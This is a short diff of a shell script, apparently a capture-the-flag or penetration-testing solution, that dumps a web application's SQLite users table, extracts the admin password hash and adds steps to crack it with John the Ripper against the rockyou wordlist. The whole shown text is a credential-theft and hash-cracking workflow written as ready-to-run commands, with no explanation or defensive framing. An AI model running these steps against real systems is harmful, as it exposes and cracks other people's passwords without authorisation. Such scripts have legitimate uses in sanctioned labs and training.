@@ -17,10 +17,14 @@ mv webapp.db /work/webapp.db
 
 # Use sqlite3 to gather content
 # Perform the query
-sqlite3 /work/webapp.db ".tables"
-sqlite3 /work/webapp.db "PRAGMA table_info(users)"
+sqlite3 /work/webapp.db ".tables" > /work/tables
+sqlite3 /work/webapp.db "PRAGMA table_info(users)" > /work/headers
 sqlite3 /work/webapp.db "SELECT * FROM users;" > /work/users
 
 # Gather admin password
 HASH=$(grep admin /work/users | awk -F'|' '{print $3}')
-echo $HASH
+echo $HASH > /work/hash.txt
+
+# Crack it with John
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /work/hash.txt
+john --show /work/hash.txt
